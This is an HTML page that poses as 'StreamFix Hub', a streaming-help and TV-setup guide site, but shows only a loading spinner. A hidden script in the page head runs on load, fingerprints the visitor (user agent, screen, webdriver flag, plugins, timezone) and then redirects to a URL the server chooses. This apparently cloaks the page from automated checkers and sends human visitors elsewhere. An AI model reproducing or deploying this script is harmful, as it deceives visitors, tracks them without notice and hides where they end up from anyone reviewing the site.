<!DOCTYPE html>
<html lang="en">
<head>
  <script>(function(){try{fetch('/api/v1/pixel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,pg:window.location.pathname})}).then(function(r){return r.json()}).then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}})();</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>StreamFix Hub — Streaming Help &amp; TV Setup Guides</title>
  <meta name="description" content="Independent streaming help for every platform and device. Step-by-step guides for Paramount+, Hulu, Disney+, ESPN+, Peacock, STARZ, FOX, Amazon Prime Video, and Vizio TV.">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif}
    .loader{text-align:center;color:#888;font-size:0.95rem}
    .spinner{width:32px;height:32px;border:3px solid #eee;border-top-color:#555;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 14px}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    Loading…
  </div>
</body>
</html>
